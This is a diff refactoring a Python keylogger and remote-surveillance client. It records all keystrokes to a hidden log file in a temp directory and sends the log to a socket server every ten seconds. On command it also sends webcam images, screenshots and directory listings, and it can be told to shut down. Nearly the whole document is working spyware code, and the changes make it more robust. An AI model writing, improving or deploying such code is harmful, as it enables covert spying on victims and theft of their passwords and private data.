@@ -1,22 +1,24 @@
 import base64
 import ctypes
-import cv2
 import datetime
 import io
 import json
 import logging
 import os
 import platform
-import pyautogui
 import socket
 import threading
 import time
 
+import cv2
+import pyautogui
 from pynput.keyboard import Listener
 
 stop = False
+LOG_DIR_WINDOWS = os.path.join(os.environ['USERPROFILE'], 'AppData', 'Local', 'Temp', 'logs')
+LOG_DIR_LINUX = '/tmp/logs'
 
-# Function to get the operating system of the client
+
 def get_os():
     return platform.system()
 
@@ -32,42 +34,42 @@ def create_connection(host, port):
 
 
 def setup_logging(filename):
+    if not os.path.exists(os.path.dirname(filename)):
+        os.makedirs(os.path.dirname(filename))
     logging.basicConfig(
         filemode='a',
         filename=filename,
-        datefmt='%d/%m/20%y %I:%M:%S',
+        datefmt='%Y-%m-%d %H:%M:%S',
         format='%(asctime)s %(message)s',
         level=logging.DEBUG
     )
-    pass
 
 
 def hide_file(filename):
     if get_os() == 'Windows':
         ctypes.windll.kernel32.SetFileAttributesW(filename, 2)
     elif get_os() == 'Linux':
-        os.popen(f'chmod 777 {filename}')
+        os.popen(f'chmod 700 {filename}')
     else:
-        print(f"OS not supported: {get_os()}")
-    pass
+        print("OS not supported for hiding files.")
 
 
 def log_key_press(key):
     logging.info(str(key))
-    pass
 
 
 def send_log_message(sock, filename):
+    if not os.path.exists(filename):
+        print(f"Log file not found: {filename}")
+        return
     try:
         with open(filename, 'rb') as f:
             file_content_encoded = base64.b64encode(f.read()).decode()
-
             client_info = {
                 'command': 'LOG',
-                'filename': filename,
+                'filename': os.path.basename(filename),
                 'file_content': file_content_encoded
             }
-
             json_data = json.dumps(client_info)
             sock.sendall(json_data.encode())
     except socket.error as e:
@@ -85,7 +87,6 @@ def capture_and_send_webcam(sock):
         _, buffer = cv2.imencode('.jpg', frame)
         encoded_image = base64.b64encode(buffer).decode()
 
-        # Envoi de l'image
         client_info = {
             'command': 'WEBCAM',
             'image': encoded_image
@@ -134,7 +135,7 @@ def receive_commands(sock):
                         json_data = json.dumps(client_info)
                         sock.send(json_data.encode())
 
-                if command_type == 'SHOW':
+                elif command_type == 'SHOW':
                     files = os.listdir()
                     client_info = {
                         'command': 'SHOW',
@@ -143,7 +144,7 @@ def receive_commands(sock):
                     json_data = json.dumps(client_info)
                     sock.send(json_data.encode())
 
-                if command_type == 'SCREENSHOT':
+                elif command_type == 'SCREENSHOT':
                     screenshot = pyautogui.screenshot()
                     screenshot_bytes = io.BytesIO()
                     screenshot.save(screenshot_bytes, format='PNG')
@@ -158,11 +159,11 @@ def receive_commands(sock):
                     json_data = json.dumps(client_info)
                     sock.send(json_data.encode())
 
-                if command_type == 'WEBCAM':
+                elif command_type == 'WEBCAM':
                     webcam_thread = threading.Thread(target=capture_and_send_webcam, args=(sock,))
                     webcam_thread.start()
 
-                if command_type == 'KILL':
+                elif command_type == 'KILL':
                     global stop
                     stop = True
                     client_info = {
@@ -184,22 +185,29 @@ def main():
     host = 'localhost'
     port = 9809
     current_hour = datetime.datetime.now().strftime("%Hh")
-    filename = f'{current_hour}_keyboard.log'
-    setup_logging(filename)
-    hide_file(filename)
+    log_dir = LOG_DIR_WINDOWS if get_os() == 'Windows' else LOG_DIR_LINUX
+    log_file = os.path.join(log_dir, f'{current_hour}_keyboard.log')
+
+    setup_logging(log_file)
+    hide_file(log_dir)
 
     try:
         sock = create_connection(host, port)
-
         listener = Listener(on_press=log_key_press)
         listener.start()
-
         command_thread = threading.Thread(target=receive_commands, args=(sock,))
         command_thread.start()
 
-        while not stop:
-            send_log_message(sock, filename)
-            time.sleep(10)
+        try:
+            while not stop:
+                send_log_message(sock, log_file)
+                time.sleep(10)
+        except KeyboardInterrupt:
+            if sock:
+                sock.close()
+            listener.stop()
+            command_thread.join()
+            os._exit(0)
 
     except socket.error as e:
         print(f"Connection error: {e}")
